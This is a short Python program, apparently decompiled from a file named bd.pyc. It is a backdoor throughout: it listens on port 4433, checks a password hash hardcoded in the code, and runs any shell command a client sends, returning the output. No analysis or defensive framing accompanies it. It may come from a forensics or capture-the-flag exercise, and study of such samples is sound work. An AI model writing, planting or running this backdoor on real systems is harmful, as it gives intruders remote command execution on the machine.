import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32)
        if len(data) != 32:
            client.close()

        if data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
            client.send(b'Invalid')
            client.close()
        else:
            size = client.recv(1)
            command = client.recv(int.from_bytes(size, 'little'))
            print(command)
            if not command.startswith(b'command:'):
                client.close()
            else:
                command = command.replace(b'command:', b'')
                output = check_output(command, shell=True)
                client.send(output)
                client.close()
# okay decompiling bd.pyc
